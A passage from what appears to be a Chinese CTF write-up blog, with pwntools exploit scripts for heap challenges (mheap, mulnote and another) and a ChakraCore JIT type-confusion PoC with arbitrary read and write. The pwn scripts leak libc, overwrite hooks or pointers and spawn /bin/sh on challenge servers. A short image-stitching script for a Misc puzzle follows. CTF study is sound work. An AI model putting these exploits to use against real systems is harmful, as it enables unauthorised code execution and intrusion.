p.rl(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sl(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">idx</span>):</span><br><span class="line">    p.rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    p.sl(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.rl(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sl(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modify</span>(<span class="params">idx,size</span>):</span><br><span class="line">    p.rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    p.sl(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.rl(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.rl(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    p.sl(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    p.rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    p.sl(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.rl(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.rl(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    p.sl(<span class="built_in">str</span>(size))</span><br><span class="line">    p.rl(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    p.sl(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.rl(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sl(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    modify(<span class="number">0</span>,<span class="number">0x63</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    things = p.rl(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(things) &gt;= <span class="number">0x63</span> :</span><br><span class="line">        byte = u8(things[-<span class="number">1</span>:])</span><br><span class="line">        <span class="keyword">if</span> byte == <span class="number">0x40</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;waitting :&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(byte))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    modify(<span class="number">0</span>,<span class="number">0x62</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    things = p.rl(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(things) &gt;= <span class="number">0x62</span> :</span><br><span class="line">        byte = u8(things[-<span class="number">2</span>:-<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span> byte == <span class="number">0x40</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;waitting :&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(byte))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    modify(<span class="number">0</span>,<span class="number">0x61</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    things = p.rl(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(things) &gt;= <span class="number">0x61</span> :</span><br><span class="line">        byte = u8(things[-<span class="number">3</span>:-<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">if</span> byte == <span class="number">0xd0</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Get it : &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(byte))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># you can attack it</span></span><br><span class="line">create(<span class="number">3</span>)</span><br><span class="line">create(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x40</span>,p64(<span class="number">0xdeadbeef</span>)*<span class="number">2</span>+p64(<span class="number">0x404070</span>)*<span class="number">5</span>+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="comment"># edit success!!</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x50</span>,p64(<span class="number">0xdeadbeef</span>)*<span class="number">2</span>+p64(<span class="number">0x404070</span>)*<span class="number">7</span>+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_creater = u64(p.rl(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>)) - a.symbols[<span class="string">&quot;atoi&quot;</span>]</span><br><span class="line">system = libc_creater + a.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"><span class="comment"># use the pointer to get it.</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(system)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\x00&quot;</span>+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3><span id="mheap">mheap</span><a href="#mheap" class="header-anchor"></a></h3><p>read 的时候会出错向上写单链表指针控制list</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#p = process(&quot;./mheap&quot;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;112.126.98.5&quot;</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>):</span><br><span class="line">    p.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">x</span>):</span><br><span class="line">    p.recvuntil(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    p.rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    p.sl(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.rl(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.rl(<span class="string">&quot;Input size: &quot;</span>)</span><br><span class="line">    p.sl(<span class="built_in">str</span>(size))</span><br><span class="line">    p.rl(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    p.send(<span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">idx</span>):</span><br><span class="line">    p.rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    p.sl(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.rl(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sl(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modify</span>(<span class="params">idx,content</span>):</span><br><span class="line">    p.rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    p.sl(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.rl(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sl(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    p.sl(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.rl(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sl(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>,<span class="number">3840</span>+<span class="number">0x10</span>,<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">create(<span class="number">1</span>,<span class="number">80</span>,<span class="string">&quot;a&quot;</span>*<span class="number">80</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">2</span>,<span class="number">256</span>,p64(<span class="number">0x60</span>)+p64(<span class="number">0x4040e0</span>)+<span class="string">&quot;\x22&quot;</span>*(<span class="number">0xd0</span>-<span class="number">1</span>)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">1</span>,<span class="number">80</span>,<span class="string">&quot;a&quot;</span>+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">2</span>,<span class="number">0x23330000</span>,p64(<span class="number">0x404050</span>)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc_creater = u64(p.rl(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">0x40680</span></span><br><span class="line">system = <span class="number">0x4f440</span>+libc_creater</span><br><span class="line">modify(<span class="number">2</span>,p64(system))</span><br><span class="line"></span><br><span class="line">p.rl(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sl(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3><span id="mulnote">mulnote</span><a href="#mulnote" class="header-anchor"></a></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">c</span>(<span class="params">size,data</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&#x27;C&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">idx</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&#x27;R&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">e</span>(<span class="params">idx,data</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&#x27;E&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	io.sendafter(<span class="string">&quot;&gt;&quot;</span>,data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>():</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&#x27;S&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./mulnote&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;112.126.101.96&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line">c(<span class="number">0x100</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">r(<span class="number">0</span>)</span><br><span class="line">s()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;[0]:\n&#x27;</span>)</span><br><span class="line">lbase = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3c4b78</span></span><br><span class="line">success(<span class="built_in">hex</span>(lbase))</span><br><span class="line">c(<span class="number">0x60</span>,<span class="string">&#x27;tcl&#x27;</span>)</span><br><span class="line">c(<span class="number">0x60</span>,<span class="string">&#x27;tcl&#x27;</span>)</span><br><span class="line">c(<span class="number">0x60</span>,<span class="string">&#x27;tcl&#x27;</span>)</span><br><span class="line">r(<span class="number">1</span>)</span><br><span class="line">r(<span class="number">2</span>)</span><br><span class="line">r(<span class="number">1</span>)</span><br><span class="line">c(<span class="number">0x60</span>,p64(lbase+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>))</span><br><span class="line">c(<span class="number">0x60</span>,p64(lbase+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>))</span><br><span class="line">c(<span class="number">0x60</span>,p64(lbase+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>))</span><br><span class="line">c(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(lbase+<span class="number">0x4526a</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3><span id="childjs">childjs</span><a href="#childjs" class="header-anchor"></a></h3><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1702">PoC和解析</a><br>真·面向CVE做题</p>
<p>任意地址读</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">opt</span>(<span class="params">o, proto, value</span>) &#123;</span><br><span class="line">    o.<span class="property">b</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> tmp = &#123;<span class="attr">__proto__</span>: proto&#125;;</span><br><span class="line"></span><br><span class="line">    o.<span class="property">a</span> = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">2000</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> o = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>&#125;;</span><br><span class="line">        <span class="title function_">opt</span>(o, &#123;&#125;, &#123;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> o = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">opt</span>(o, o, <span class="number">0x1234</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">print</span>(o.<span class="property">a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>();</span><br></pre></td></tr></table></figure>
<p>任意地址写</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">obj = &#123;&#125;</span><br><span class="line">obj.<span class="property">a</span> = <span class="number">1</span>;</span><br><span class="line">obj.<span class="property">b</span> = <span class="number">2</span>;</span><br><span class="line">obj.<span class="property">c</span> = <span class="number">3</span>;</span><br><span class="line">obj.<span class="property">d</span> = <span class="number">4</span>;</span><br><span class="line">obj.<span class="property">e</span> = <span class="number">5</span>;</span><br><span class="line">obj.<span class="property">f</span> = <span class="number">6</span>;</span><br><span class="line">obj.<span class="property">g</span> = <span class="number">7</span>;</span><br><span class="line">obj.<span class="property">h</span> = <span class="number">8</span>;</span><br><span class="line">obj.<span class="property">i</span> = <span class="number">9</span>;</span><br><span class="line">obj.<span class="property">j</span> = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">dv1 = <span class="keyword">new</span> <span class="title class_">DataView</span>(<span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x100</span>));</span><br><span class="line">dv2 = <span class="keyword">new</span> <span class="title class_">DataView</span>(<span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x100</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable constant_">BASE</span> = <span class="number">0x100000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">x</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + x.<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">opt</span>(<span class="params">o, c, value</span>) &#123;</span><br><span class="line">    o.<span class="property">b</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">A</span> <span class="keyword">extends</span> <span class="title class_ inherited__">c</span> &#123;&#125;</span><br><span class="line">    <span class="keyword">let</span> tmp = &#123;<span class="attr">__proto__</span>: proto&#125;;</span><br><span class="line"></span><br><span class="line">    o.<span class="property">a</span> = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">2000</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> o = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>&#125;;</span><br><span class="line">        <span class="title function_">opt</span>(o, (<span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;), &#123;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> o = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>&#125;;</span><br><span class="line">    <span class="keyword">let</span> cons = <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    cons.<span class="property"><span class="keyword">prototype</span></span> = o;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">opt</span>(o, o, obj); <span class="comment">// o-&gt;auxSlots = obj (Step 1)</span></span><br><span class="line"></span><br><span class="line">    o.<span class="property">c</span> = dv1; <span class="comment">// obj-&gt;auxSlots = dv1 (Step 2)</span></span><br><span class="line"></span><br><span class="line">    obj.<span class="property">h</span> = dv2; <span class="comment">// dv1-&gt;buffer = dv2 (Step 3)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> read64 = <span class="keyword">function</span>(<span class="params">addr_lo, addr_hi</span>) &#123;</span><br><span class="line">        <span class="comment">// dv2-&gt;buffer = addr (Step 4)</span></span><br><span class="line">        dv1.<span class="title function_">setUint32</span>(<span class="number">0x38</span>, addr_lo, <span class="literal">true</span>);</span><br><span class="line">        dv1.<span class="title function_">setUint32</span>(<span class="number">0x3C</span>, addr_hi, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// read from addr (Step 5)</span></span><br><span class="line">        <span class="keyword">return</span> dv2.<span class="title function_">getInt32</span>(<span class="number">0</span>, <span class="literal">true</span>) + dv2.<span class="title function_">getInt32</span>(<span class="number">4</span>, <span class="literal">true</span>) * <span class="variable constant_">BASE</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> write64 = <span class="keyword">function</span>(<span class="params">addr_lo, addr_hi, value_lo, value_hi</span>) &#123;</span><br><span class="line">        <span class="comment">// dv2-&gt;buffer = addr (Step 4)</span></span><br><span class="line">        dv1.<span class="title function_">setUint32</span>(<span class="number">0x38</span>, addr_lo, <span class="literal">true</span>);</span><br><span class="line">        dv1.<span class="title function_">setUint32</span>(<span class="number">0x3C</span>, addr_hi, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write to addr (Step 5)</span></span><br><span class="line">        dv2.<span class="title function_">setInt32</span>(<span class="number">0</span>, value_lo, <span class="literal">true</span>);</span><br><span class="line">        dv2.<span class="title function_">setInt32</span>(<span class="number">0</span>, value_hi, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get dv2 vtable pointer</span></span><br><span class="line">    vtable_lo = dv1.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">    vtable_hi = dv1.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="title function_">print</span>(<span class="title function_">hex</span>(vtable_lo + vtable_hi * <span class="variable constant_">BASE</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// read first vtable entry using the RW primitive</span></span><br><span class="line">    <span class="title function_">print</span>(<span class="title function_">hex</span>(<span class="title function_">read64</span>(vtable_lo, vtable_hi)));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// write a value to address 0x1111111122222222 using the RW primitive (this will crash)</span></span><br><span class="line">    <span class="title function_">write64</span>(<span class="number">0x22222222</span>, <span class="number">0x11111111</span>, <span class="number">0x1337</span>, <span class="number">0x1337</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>();</span><br></pre></td></tr></table></figure>
<p>用这个安全客的脚本修改一下libChakraCore的got表就完事儿了，NX没开，got中的<code>resolve</code>指向bss，跑个shellcode，搞定</p>
<h2><span id="misc">Misc</span><a href="#misc" class="header-anchor"></a></h2><h3><span id="jigsaw">jigsaw</span><a href="#jigsaw" class="header-anchor"></a></h3><p>纯拼图，按照时间排下序完事了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;./pics/&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_list</span>(<span class="params">file_path</span>):</span><br><span class="line">    dir_list = os.listdir(file_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> dir_list:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dir_list = <span class="built_in">sorted</span>(dir_list,  key=<span class="keyword">lambda</span> x: os.path.getmtime(os.path.join(file_path, x)))</span><br><span class="line">        <span class="comment"># print(dir_list)</span></span><br><span class="line">        <span class="keyword">return</span> dir_list</span><br><span class="line">list_im = get_file_list(path)</span><br><span class="line">column = <span class="number">21</span></span><br><span class="line">row_num = <span class="number">11</span></span><br><span class="line">width = <span class="number">35</span></span><br><span class="line">height = <span class="number">43</span></span><br><span class="line">imgs = [Image.<span class="built_in">open</span>(path+i) <span class="keyword">for</span> i <span class="keyword">in</span> list_im]</span><br><span class="line">target = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width*column, height*row_num))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(list_im)):</span><br><span class="line">    <span class="keyword">if</span> i % column == <span class="number">0</span>:</span><br><span class="line">        end = <span class="built_in">len</span>(list_im) <span class="keyword">if</span> i + column &gt; <span class="built_in">len</span>(list_im) <span class="keyword">else</span> i + column </span><br><span class="line">        <span class="keyword">for</span> col, image <span class="keyword">in</span> <span class="built_in">enumerate</span>(imgs[i:i+column]):</span><br><span 